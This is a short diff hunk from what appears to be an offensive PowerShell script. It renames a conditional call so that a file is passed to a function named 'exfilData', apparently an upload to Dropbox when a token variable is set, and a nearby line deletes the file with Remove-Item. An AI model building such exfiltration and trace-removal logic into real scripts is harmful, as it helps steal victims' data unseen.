@@ -37,4 +37,4 @@ function exfilData {
 
     Remove-Item $FileName
     }
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $FileName}
+if (-not ([string]::IsNullOrEmpty($db))){exfilData -f $FileName}
